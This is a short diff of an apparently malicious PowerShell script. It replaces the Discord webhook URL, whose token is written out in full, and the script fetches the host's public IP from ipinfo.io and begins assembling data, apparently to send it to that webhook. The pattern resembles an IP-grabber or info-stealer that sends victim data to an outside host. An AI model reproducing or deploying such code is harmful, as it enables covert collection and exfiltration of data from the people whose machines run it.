@@ -1,4 +1,4 @@
-$dgf = "https://discord.com/api/webhooks/1308285020258963507/nxXfrF6kk4bhYkAjWjLp1kJCDucYPV-XJd7ZaVl_w8XEdmFthT9K1P0NoT0aBJ1NnpAJ"
+$dgf = "https://discord.com/api/webhooks/1316298613969784862/_OMy4oqca0lsmkHKpRjDC_3YwN8-sozzs_damUpQqIjDD7SRna4YF12_707FeHdReO-L"
 $ipInfo = Invoke-RestMethod -Uri "https://ipinfo.io/json"
 $wwwww = $ipInfo.ip
 $me = @{
